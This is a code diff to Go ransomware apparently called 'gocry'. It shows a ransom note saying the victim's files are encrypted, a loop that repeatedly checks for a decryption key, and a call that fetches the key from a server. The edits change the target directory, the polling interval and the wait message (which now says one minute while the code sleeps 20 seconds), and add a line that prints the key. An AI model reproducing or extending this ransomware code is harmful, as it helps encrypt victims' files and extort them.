@@ -14,7 +14,7 @@ import (
 	"golang.org/x/exp/errors/fmt"
 )
 
-var rootToEncrypt string = "./test/"
+var rootToEncrypt string = "./test"
 
 const message string = `
 Hello, you've been infected by gocry. Your files have been encrypted using military grade encryption >:D.
@@ -60,8 +60,8 @@ func main() {
 				os.Exit(0)
 			}
 
-			fmt.Println("Key did not match, checking again in 3 minutes...")
-			time.Sleep(time.Minute * 3)
+			fmt.Println("Key did not match, checking again in 1 minute(s)...")
+			time.Sleep(time.Second * 20)
 		}
 	}()
 
@@ -87,6 +87,8 @@ func main() {
 			if err != nil {
 				log.Fatalf("error reading key file: %s", err)
 			}
+
+			fmt.Println(key)
 
 			decryptedKey, err := victim.GetKeyFromServer(key)
 			if err != nil {
